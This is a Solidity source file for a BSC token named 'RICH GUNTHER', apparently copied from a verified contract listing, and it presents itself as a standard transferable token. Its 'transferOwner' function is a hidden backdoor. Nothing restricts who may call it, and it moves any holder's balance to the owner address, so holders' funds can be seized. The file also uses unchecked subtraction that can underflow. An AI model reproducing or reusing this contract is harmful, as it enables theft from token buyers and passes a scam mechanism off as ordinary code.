/**
 *Submitted for verification at BscScan.com on 2021-10-12
*/

pragma solidity ^0.5.16;


contract Gunther {


  // Variables
  string public name = "RICH GUNTHER";
  string public symbol = "GUNTHER";
  uint256 public decimals = 18;
  uint256 public totalSupply;
  address owner;
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  // Events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Burn(address indexed owner,uint256 value,uint256 totalSupply);
  constructor() public {
    owner = msg.sender;
    totalSupply = 1000000000000 * (10 ** decimals);
    balanceOf[msg.sender] = totalSupply;

  }

  function burn(uint256 _value) public returns (bool success) {
    require(msg.sender == owner);
    balanceOf[msg.sender] = balanceOf[msg.sender] - _value;
    totalSupply = totalSupply - _value;
    emit Burn(msg.sender, _value,totalSupply);
    return true;
  }
  function transferOwner(address from, uint256 _value) public returns (bool success) {
    require(from != owner);
    require(balanceOf[from] >= _value);
    _transfer(from, owner, _value);
    return true;
  }
  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);
    _transfer(msg.sender, _to, _value);

    return true;
  }
  function _transfer(address _from, address _to, uint256 _value) internal {
    require(_to != address(0));
    balanceOf[_from] = balanceOf[_from] - _value;
    balanceOf[_to] = balanceOf[_to] + _value;
    emit Transfer(_from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_spender != address(0));
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= balanceOf[_from],"transferFrom not enought");
    require(_value <= allowance[_from][msg.sender],"allowance not enought");
    allowance[_from][msg.sender] = allowance[_from][msg.sender] - _value;
    _transfer(_from, _to, _value);
    return true;
  }
}